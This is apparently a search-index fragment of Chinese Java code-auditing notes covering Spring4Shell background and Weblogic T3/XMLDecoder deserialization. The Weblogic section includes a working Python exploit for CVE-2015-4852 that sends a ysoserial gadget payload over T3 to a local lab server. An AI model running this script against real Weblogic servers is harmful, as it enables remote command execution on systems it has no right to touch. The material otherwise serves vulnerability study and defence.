\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u7b7e\u540d\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u7b7e\u540d\u3002 SecretKeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 Mac.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u6d88\u606f\u8ba4\u8bc1\u7801\uff08MAC\uff09\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u8ba4\u8bc1\u3002 KeyAgreement.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u534f\u8bae\u5bf9\u8c61\uff0c\u2f64\u4e8e\u534f\u5546\u5bc6\u94a5\u3002 KeyPairGenerator.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u5bf9\u2f63\u6210\u5668\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5 \u5bf9\u3002 KeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyManagerFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u7ba1\u7406\u5668\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210 \u5bc6\u94a5\u7ba1\u7406\u5668\u3002","title":"\u5e38\u89c1\u654f\u611f\u51fd\u6570\u641c\u96c6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/","text":"\u8ddf\u8e2a\u590d\u73b0\u6c89\u6dc0 Weblogic shiro Spring","title":"\u8ddf\u8e2a\u590d\u73b0\u6c89\u6dc0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/#_1","text":"Weblogic shiro Spring","title":"\u8ddf\u8e2a\u590d\u73b0\u6c89\u6dc0"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/Spring/","text":"Spring SpringCoreRce\uff08CVE-2022-22965\uff09","title":"Spring"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/Spring/#spring","text":"SpringCoreRce\uff08CVE-2022-22965\uff09","title":"Spring"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/","text":"SpringCoreRce\uff08CVE-2022-22965\uff09 \u76ee\u5f55 \u524d\u7f6e\u77e5\u8bc6 \u53c2\u6570\u7ed1\u5b9a Java Bean PropertyDescriptor Spring BeanWrapperImpl Tomcat AccessLogValve \u548c access_log \u524d\u7f6e\u77e5\u8bc6 \u53c2\u6570\u7ed1\u5b9a Spring Controller\u65b9\u6cd5\u7684\u53c2\u6570\u4e3aObject\u65f6\uff0c\u4f1a\u5bf9\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u4e00\u4e2a\u81ea\u52a8\u7ed1\u5b9a\u5230\u7279\u5b9a\u5c5e\u6027\u7684\u64cd\u4f5c\u3002 Java Bean PropertyDescriptor JDK\u81ea\u5e26\u7684\uff08java.beans)\u63a7\u5236bean\u5bf9\u8c61\u7684\u7c7b\uff08\u53ef\u4ee5\u8c03\u7528bean\u5bf9\u8c61\u4efb\u610f\u5c5e\u6027\u7684get/set\u65b9\u6cd5\uff09 Spring BeanWrapperImpl \u5728Spring\u4e2d\uff0cBeanWrapper\u63a5\u53e3\u662f\u5bf9Bean\u7684\u5305\u88c5\uff0c\u5b9a\u4e49\u4e86\u5927\u91cf\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u65b9\u6cd5\u5bf9Bean\u7684\u5c5e\u6027\u8fdb\u884c\u8bbf\u95ee\u548c\u8bbe\u7f6e\u3002 BeanWrapperImpl\u7c7b\u662fBeanWrapper\u63a5\u53e3\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0cBeanWrapperImpl.wrappedObject\u5c5e\u6027\u5373\u4e3a\u88ab\u5305\u88c5\u7684Bean\u5bf9\u8c61\uff0cBeanWrapperImpl\u5bf9Bean\u7684\u5c5e\u6027\u8bbf\u95ee\u548c\u8bbe\u7f6e\u6700\u7ec8\u8c03\u7528\u7684\u662fPropertyDescriptor\u3002 Tomcat AccessLogValve \u548c access_log","title":"SpringCoreRce\uff08CVE-2022-22965\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#springcorercecve-2022-22965","text":"","title":"SpringCoreRce\uff08CVE-2022-22965\uff09"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#_1","text":"\u524d\u7f6e\u77e5\u8bc6 \u53c2\u6570\u7ed1\u5b9a Java Bean PropertyDescriptor Spring BeanWrapperImpl Tomcat AccessLogValve \u548c access_log","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#_2","text":"","title":"\u524d\u7f6e\u77e5\u8bc6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#_3","text":"Spring Controller\u65b9\u6cd5\u7684\u53c2\u6570\u4e3aObject\u65f6\uff0c\u4f1a\u5bf9\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u4e00\u4e2a\u81ea\u52a8\u7ed1\u5b9a\u5230\u7279\u5b9a\u5c5e\u6027\u7684\u64cd\u4f5c\u3002","title":"\u53c2\u6570\u7ed1\u5b9a"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#java-bean-propertydescriptor","text":"JDK\u81ea\u5e26\u7684\uff08java.beans)\u63a7\u5236bean\u5bf9\u8c61\u7684\u7c7b\uff08\u53ef\u4ee5\u8c03\u7528bean\u5bf9\u8c61\u4efb\u610f\u5c5e\u6027\u7684get/set\u65b9\u6cd5\uff09","title":"Java Bean PropertyDescriptor"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#spring-beanwrapperimpl","text":"\u5728Spring\u4e2d\uff0cBeanWrapper\u63a5\u53e3\u662f\u5bf9Bean\u7684\u5305\u88c5\uff0c\u5b9a\u4e49\u4e86\u5927\u91cf\u53ef\u4ee5\u975e\u5e38\u65b9\u4fbf\u7684\u65b9\u6cd5\u5bf9Bean\u7684\u5c5e\u6027\u8fdb\u884c\u8bbf\u95ee\u548c\u8bbe\u7f6e\u3002 BeanWrapperImpl\u7c7b\u662fBeanWrapper\u63a5\u53e3\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0cBeanWrapperImpl.wrappedObject\u5c5e\u6027\u5373\u4e3a\u88ab\u5305\u88c5\u7684Bean\u5bf9\u8c61\uff0cBeanWrapperImpl\u5bf9Bean\u7684\u5c5e\u6027\u8bbf\u95ee\u548c\u8bbe\u7f6e\u6700\u7ec8\u8c03\u7528\u7684\u662fPropertyDescriptor\u3002","title":"Spring BeanWrapperImpl"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Spring/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/SpringCoreRce%EF%BC%88CVE-2022-22965%EF%BC%89/#tomcat-accesslogvalve-access_log","text":"","title":"Tomcat AccessLogValve \u548c access_log"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/Weblogic/","text":"Weblogic \u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","title":"Weblogic"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/Weblogic/#weblogic","text":"\u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","title":"Weblogic"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"\u6d45\u6790Weblogic \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u76ee\u5f55 T3\u534f\u8bae \u6293\u5305\u5206\u6790 CVE-2015-4852 \u5206\u6790 resolveClass XMLDecoder apache xerces DocumentHandler \u5de5\u4f5c\u539f\u7406 Demo\u8c03\u8bd5 readObject ScanDocument \u603b\u7ed3 CVE-2017-3506\\&CVE-2017-10271 \u5148\u5f15\u7528\u4e00\u4e0b\u5947\u5b89\u4fe1\u56e2\u961f\u53d1\u51fa\u7684weblogic\u5386\u53f2\u6f0f\u6d1e\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u4ee5\u53cd\u5e8f\u5217\u5316\u4e3a\u4e3b\uff0c\u53cd\u5e8f\u5217\u5316\u95ee\u9898\u4e3b\u8981\u6765\u81eaXMLDecoder\u548cT3\u534f\u8bae T3\u534f\u8bae weblogic t3\u534f\u8bae\u5c31\u662fweblogic\u7684rmi\u6240\u4f7f\u7528\u7684\u534f\u8bae\u3002 \u5728\u4f20\u7edfjava\u4e2d\uff0crmi\u4f7f\u7528\u7684\u662fjrmp\u534f\u8bae\u3002 JRMP\u534f\u8bae\u7684\u901a\u4fe1\u7531\u5982\u4e0b\u90e8\u5206\u6784\u6210 \u5ba2\u6237\u7aef\u5bf9\u8c61 \u670d\u52a1\u7aef\u5bf9\u8c61 \u5ba2\u6237\u7aef\u4ee3\u7406\u5bf9\u8c61\uff08stub\uff09 \u670d\u52a1\u7aef\u4ee3\u7406\u5bf9\u8c61\uff08skeleton\uff09 \u800cT3\u534f\u8bae\u5728JRMP\u534f\u8bae\u4e0a\u505a\u51fa\u4e86\u6539\u8fdb\uff0cstub\u548cskeleton\u90fd\u662f\u52a8\u6001\u751f\u6210\u7684\uff0c\u5c06\u5bf9\u8c61\u90e8\u7f72\u5230RMI\u6ce8\u518c\u4e2d\u5fc3\u65f6weblogic\u4f1a\u81ea\u52a8\u751f\u6210stub\u548cskeleton\u3002 Weblogic\u4e4b\u6240\u4ee5\u5f00\u53d1T3\u534f\u8bae\uff0c\u662f\u56e0\u4e3a\u4ed6\u4eec\u9700\u8981\u53ef\u6269\u5c55\uff0c\u9ad8\u6548\u7684\u534f\u8bae\u6765\u4f7f\u7528Java\u6784\u5efa\u4f01\u4e1a\u7ea7\u7684\u5206\u5e03\u5f0f\u5bf9\u8c61\u7cfb\u7edf \u6293\u5305\u5206\u6790 \u6211\u4eec\u60f3\u6293\u5305\u5206\u6790T3\u534f\u8bae\u6709\u4e24\u4e2a\u65b9\u6cd5 1.\u5199\u4e00\u4e2aT3 rmi server\u548c\u4e00\u4e2aT3 rmi client\uff0c\u542f\u52a8client\u53bb\u8bf7\u6c42rmi server\uff0c\u4ece\u800c\u5b9e\u73b0\u6293\u5305\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8be6\u7ec6\u6b65\u9aa4\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8 2.\u4f7f\u7528python\u6a21\u62dfclient\u53d1\u5305\uff0c\u4ece\u800c\u5b9e\u73b0T3\u534f\u8bae\u6293\u5305\u5206\u6790\u3002\u8fd9\u4e2a\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u5bb9\u6613\uff0c\u6211\u4eec\u5c31\u901a\u8fc7\u8be5\u65b9\u6cd5\u6765\u4e00\u7aa5T3\u534f\u8bae\u7684\u5965\u5999\u3002 https://xz.aliyun.com/t/10365#toc-1\u73af\u5883\u7684\u642d\u5efa\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u5728\u5b8c\u6210\u73af\u5883\u642d\u5efa\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u5982\u4e0bexp from os import popen import struct # \u8d1f\u8d23\u5927\u5c0f\u7aef\u7684\u8f6c\u6362 import subprocess from sys import stdout import socket import re import binascii def generatePayload(gadget,cmd): YSO_PATH = \"E:\\\\tools\\\\java\\\\ysoserial-master-d367e379d9-1.jar\" popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE) return popen.stdout.read() def T3Exploit(ip,port,payload): sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.connect((ip,port)) handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\" sock.sendall(handshake.encode()) data = sock.recv(1024) compile = re.compile(\"HELO:(.*).0.false\") match = compile.findall(data.decode()) if match: print(\"Weblogic: \"+\"\".join(match)) else: print(\"Not Weblogic\") #return header = binascii.a2b_hex(b\"00000000\") t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") desflag = binascii.a2b_hex(b\"fe010000\") payload = header + t3header +desflag+ payload payload = struct.pack(\">I\",len(payload)) + payload[4:] sock.send(payload) if __name__ == \"__main__\": ip = \"127.0.0.1\" port = 7001 gadget = \"CommonsCollections1\" cmd = \"touch /tmp/hack\" payload = generatePayload(gadget,cmd) T3Exploit(ip,port,payload) \u6307\u5b9a\u7aef\u53e3\u548cIP\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6307\u4ee4\u6765\u770b\u662f\u5426\u653b\u51fb\u6210\u529f docker exec weblogic1036jdk7u21 ls tmp/ \u6211\u4eec\u901a\u8fc7\u6293\u53d6\u76f8\u5173\u6d41\u91cf\u5305\u6765\u4e00\u7aa5T3\u534f\u8bae\uff0cwireshark\u8bbe\u7f6etcp.port==7001\uff0c\u6267\u884c\u4ee5\u4e0a\u811a\u672c\uff0c\u6293\u53d6T3\u6d41\u91cf \u53d1\u9001\u7684\u7b2c\u4e00\u4e2a\u5305\u4e3aT3\u534f\u8bae\u5934\uff0ct3\u540e\u9762\u63a5\u7684\u4f7fweblogic\u5ba2\u6237\u7aef\u7248\u672c \u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u5e94\u7b54\uff0c\u5e76\u5728HELO \u540e\u63a5weblogic\u670d\u52a1\u7aef\u7248\u672c\uff0c\u5229\u7528\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u523a\u63a2weblogic\u670d\u52a1\u5668\u7248\u672c \u63a5\u4e0b\u6765\u5ba2\u6237\u7aef\u4f1a\u53d1\u9001\u4e00\u4e2a\u76f8\u5bf9\u6bd4\u8f83\u5927\u7684\u6570\u636e\u5305\uff0c\u5176\u5185\u5bb9\u5206\u6790\u5982\u4e0b \u6570\u636e\u5305\u4ec5\u4e3a\u84dd\u8272\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u4e2a\u6846\u4e2d\u662f\u6570\u636e\u5305\u7684\u957f\u5ea6\uff0c\u7b2c\u4e8c\u4e2a\u6846\u662f\u53cd\u5e8f\u5217\u5316\u6807\u5fd7\uff0c\u4e24\u4e2a\u6846\u4e2d\u95f4\u662fT3\u534f\u8bae\u5934\uff0c\u5269\u4e0b\u7684\u4fbf\u662f\u5e8f\u5217\u5316\u6570\u636e\u3002 T3\u534f\u8bae\u53d1\u9001\u5e8f\u5217\u5316\u6570\u636e\u65f6\u6709\u65f6\u5019\u5e76\u4e0d\u53ea\u53d1\u9001\u4e00\u6bb5\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5b83\u53ef\u80fd\u4f1a\u53d1\u9001\u591a\u4e2a\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5f7c\u6b64\u4e4b\u95f4\u4ee5\u53cd\u5e8f\u5217\u5316\u6807\u5fd7\u9694\u5f00\uff0c\u5c31\u50cf\u8fd9\u6837 CVE-2015-4852 \u6f0f\u6d1e\u7248\u672c 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 \u4e0a\u9762\u7684exp\u5c31\u662f\u54ea\u6765\u6253\u8fd9\u4e2a\u6d1e\u7684\uff0c\u4e0a\u8ff0CVE\u7248\u672c\u6ca1\u6709\u5bf9T3\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u95ee\u9898\u505a\u4efb\u4f55\u9632\u8303\uff0c\u5229\u7528T3\u534f\u8bae\u53cd\u5e8f\u5217\u5316CC\u94fe\u3002jdk1.7\uff0cweblogic10.3.6.0 \u7528cc\u94fe1\uff0c3\uff0c6\u90fd\u80fd\u6253\u3002 \u8fd9\u4e2a\u6d1e\u53ef\u4ee5\u8bf4\u662fweblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6e90\u5934\u4e86\u3002 \u5206\u6790 weblogic.rjvm.InboundMsgAbbrev#readObject \u4f5c\u4e3a\u5165\u53e3\u7684readObject\u65b9\u6cd5\u5c31\u5728\u6b64\u5904\uff0c\u5728\u6b64\u4e2d\u8c03\u7528\u4e86InboundMsgAbbrev.ServerChannelInputStream\u7684readObject\u65b9\u6cd5\uff0cvar1\u5373\u662f\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\uff0c\u6211\u4eec\u8fdb\u884c\u4e00\u4e2a\u8ddf\u8fdb InboundMsgAbbrev.ServerChannelInputStream#readObject \u8ddf\u8fdb\u540e\u53d1\u73b0\u6b64\u7c7b\u7ee7\u627f\u81eaObjectInputStream\u4e14\u672a\u91cd\u5199readObject\u65b9\u6cd5 \u4e5f\u5c31\u662f\u8bf4\u5e8f\u5217\u5316\u6570\u636e\u4f20\u5165\u540e\u76f4\u63a5\u4ee5\u53c2\u6570\u7684\u5f62\u5f0f\u4f20\u5165\u4e86ObjectInputStream\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u4e86\u5176readObject\u65b9\u6cd5\u3002 \u4e8e\u662f\u4fbf\u7545\u901a\u65e0\u963b\u7684\u89e6\u53d1\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e resolveClass \u8fd9\u91cc\u4e4b\u6240\u4ee5\u8981\u8bf4\u4e00\u4e0bresolveClass\uff0c\u662f\u56e0\u4e3a\u7f51\u4e0a\u5f88\u591aT3\u53cd\u5e8f\u5217\u5316\u76f8\u5173\u6587\u7ae0\u90fd\u63d0\u4e86\u8fd9\u4e2a\u4e1c\u897f\uff0c\u4e5f\u662f\u6211\u4e4b\u524d\u4e0d\u77e5\u9053\u7684\u4e00\u4e2a\u4e1c\u897f\uff0c\u6240\u4ee5\u4fbf\u8bb0\u5f55\u4e00\u4e0b\u3002 resolveClass\u662fObjectInputStream.readObject()\u4e2d\u5fc5\u7ecf\u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u5e8f\u5217\u5316\u7684\u6570\u636e\u90fd\u4f1a\u4eceresolveClass\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u7ecf\u8fc7\u4e00\u6b21\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u7c7b\u7684\u5e8f\u5217\u5316\u63cf\u8ff0\u7b26\u52a0\u5de5\u6210\u8be5\u7c7b\u7684Class\u5bf9\u8c61\uff0c\u5f88\u591a\u9488\u5bf9\u53cd\u5e8f\u5217\u5316Gadget\u7684\u62e6\u622a\u90fd\u662f\u901a\u8fc7\u91cd\u5199\u6b64\u65b9\u6cd5\u5b8c\u6210\u7684\uff08\u5982\u901a\u8fc7\u9ed1\u540d\u5355\u6765\u7981\u6b62\u67d0\u7c7b\u53cd\u5e8f\u5217\u5316\uff09 \u8d34\u4e0a\u4e00\u5f20\u5ed6\u5e08\u5085\u7684\u535a\u5ba2\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u65f6\u5e8f\u56fe\uff1a \u53ef\u4ee5\u770b\u5230\u53cd\u5e8f\u5217\u5316\u62e6\u622a\u4f4d\u7f6e\u9664\u4e86resolveClass\u4ee5\u5916\u8fd8\u6709\u4e00\u4e2aresolveProxyClass\uff0c\u5b83\u7528\u4e8e\u8fd4\u56de\u5b9e\u73b0\u4e86\u4ee3\u7406\u7c7b\u63cf\u8ff0\u7b26\u4e2d\u6240\u6709\u63a5\u53e3\u7684\u4ee3\u7406\u7c7b\uff0c\u8fd9\u91cc\u4e0d\u5bf9\u8be5\u65b9\u6cd5\u5c55\u5f00\u53d9\u8ff0\uff0c\u5b83\u4e5f\u53ef\u4ee5\u88ab\u7528\u4f5c\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u7684\u62e6\u622a \u4e0a\u6587\u5728\u5206\u6790CVE-2015-4852\u65f6\uff0cInboundMsgAbbrev.ServerChannelInputStream\u7c7b\u91cd\u5199\u4e86resolveClass\uff0c\u5982\u679c\u91cd\u5199\u5f97\u5f53\u90a3\u4e48\u5c31\u53ef\u4ee5\u8d77\u5230\u7f13\u89e3\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u4f5c\u7528\uff0c\u53ef\u60dc\u8fd9\u4e2a\u7c7b\u76f4\u63a5\u8c03\u7528\u4e86\u7236\u7c7b\u7684resolveClass XMLDecoder XMLDecoder\u662f\u4e00\u5957\u7528\u4e8e\u5bf9XML\u8fdb\u884c\u5e8f\u5217\u5316\u6216\u53cd\u5e8f\u5217\u5316\u7684\u4e00\u5957API\uff0c\u5b83\u5728JDK1.4\u5c31\u5df2\u7ecf\u88ab\u5f00\u53d1\u4e86\u51fa\u6765\uff0c\u5b83\u5bf9XML\u7684\u89e3\u6790\u6a21\u5f0f\u5e76\u4e0d\u662f\u66f4\u4e3a\u4eba\u6240\u77e5\u7684DOM\u89e3\u6790\uff0c\u800c\u662fSAX\u89e3\u6790\u3002 DOM\u89e3\u6790\u5728\u89e3\u6790XML\u65f6\u4f1a\u8bfb\u53d6\u6240\u6709\u6570\u636e\u7136\u540e\u751f\u6210DOM\u6811\u6765\u89e3\u6790\uff0c\u800cSAX\u5219\u662f\u7ebf\u6027\u8bfb\u53d6XML\uff0c\u6240\u4ee5SAX\u89e3\u6790XML\u6027\u80fd\u6d88\u8017\u76f8\u5bf9\u8f83\u5c0f\u3002 apache xerces apache xerces\u662fXMLDecoder\u89e3\u6790XML\u65f6\u7684\u4e00\u4e2a\u91cd\u8981\u7ec4\u4ef6\u3002 apache xerces\u662f\u4e00\u4e2a\u7528\u4e8e\u89e3\u6790XML\u4e2d\u6709\u54ea\u4e9b\u6807\u7b7e\uff0c\u8bed\u6cd5\u662f\u5426\u5408\u6cd5\u7684\u89e3\u6790\u5668\uff0c\u5b98\u65b9\u5728JDK1.5\u4fbf\u96c6\u6210\u4e86\u6b64\u89e3\u6790\u5668\u5e76\u4f5c\u4e3aXML\u7684\u9ed8\u8ba4\u89e3\u6790\u5668\u3002 \u5728XML\u5e8f\u5217\u5316\u6570\u636e\u4f20\u8fbe\u81f3XMLDecoder.readObject() \u65b9\u6cd5\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7b49\u64cd\u4f5c\u540e\uff0c\u4fbf\u4f1a\u4f20\u9012\u7ed9xerces\u8fdb\u884c\u89e3\u6790\uff0c\u5728xerces\u89e3\u6790\u5b8c\u6bd5\u540e\u6570\u636e\u4fbf\u4f1a\u4ea4\u7ed9DocumentHandler\u5b8c\u6210\u540e\u7eed\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u662fJDK1.6\u4fbf\u4f1a\u4ea4\u7ed9ObjectHandler\u8fdb\u884c\u5904\u7406\u3002 DocumentHandler DocumentHandler\uff08com.sun.beans.decoder.DocumentHandler\uff09\u5728XMLDecoder\u5904\u7406XML\u6570\u636e\u65f6\u8d77\u5230\u4e8b\u4ef6\u5904\u7406\u5668\u7684\u4f5c\u7528\uff0c\u5b83\u5728JDK1.7\u4e2d\u88ab\u5b9e\u73b0\u3002 \u5b83\u4f1a\u8ddf\u8fdb\u4f20\u5165\u7684XML\u6807\u7b7e\uff0c\u5c5e\u6027\u7b49\u4fe1\u606f\u8c03\u7528\u4e0d\u540c\u7684Handler\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406 \u6211\u4eec\u9488\u5bf9XMLDecoder\u7684\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u4fbf\u662f\u4f20\u5165\u7279\u5b9a\u7684XML\u5e8f\u5217\u5316\u6570\u636e\u7531DocumentHandler\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406\uff0c\u8fdb\u800c\u5b9e\u73b0RCE\u7b49\u653b\u51fb\u3002 \u4e0b\u56fe\u662fjdk1.7 DocumentHandler\u4e2d\u6240\u5b9a\u4e49\u7684\u5404\u79cd\u6807\u7b7e\u7684\u5904\u7406\u529e\u6cd5\u3002 JDK1.6\u4e2d\u4e5f\u6709\u4e2a\u548cDocumentHandler\u529f\u80fd\u7c7b\u4f3c\u7684ObjectHandler\uff0c\u4f46\u662f\u5b83\u5b9e\u73b0\u7684\u6807\u7b7e\u8fdc\u5c11\u4e8eDocumentHandler\uff0c\u4e14\u8fdc\u4e0d\u5982\u5176\u89c4\u8303\u5316\u3002\u4e0b\u56fe\u662fObjectHandler\u7684\u90e8\u5206\u4ee3\u7801\u3002 \u201c\u503c\u5f97\u6ce8\u610f\u7684\u662fCVE-2019-2725\u7684\u8865\u4e01\u7ed5\u8fc7\u5176\u4e2d\u6709\u4e00\u4e2a\u5229\u7528\u65b9\u5f0f\u5c31\u662f\u57fa\u4e8eJDK1.6\u3002\u201d \u4e0b\u9762\u4e3e\u4f8b\u4e00\u4e0b\u5404\u6807\u7b7e\u7684\u4f5c\u7528 string \\ aaa\\ 